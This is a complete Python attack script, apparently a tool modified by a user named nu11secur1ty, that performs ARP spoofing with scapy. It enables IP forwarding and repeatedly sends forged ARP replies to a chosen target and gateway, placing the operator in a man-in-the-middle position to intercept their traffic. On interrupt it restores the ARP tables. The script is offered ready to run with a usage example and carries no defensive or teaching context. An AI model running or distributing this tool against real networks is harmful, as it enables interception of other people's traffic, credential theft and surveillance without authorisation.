#!/usr/bin/python
# modified by nu11secur1ty
import os
import scapy.all as scapy
import time
import argparse
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

print("Example:\n")
print("python3 nakokrujen.py -t 0.0.0.0>target -g 0.0.0.0>gateway\n\n\n")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP")
    options = parser.parse_args()
    return options


# Get target mac address using ip address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc


# Change mac address in arp table
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Restore mac address in arp table
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("\nARP table restored. Quiting")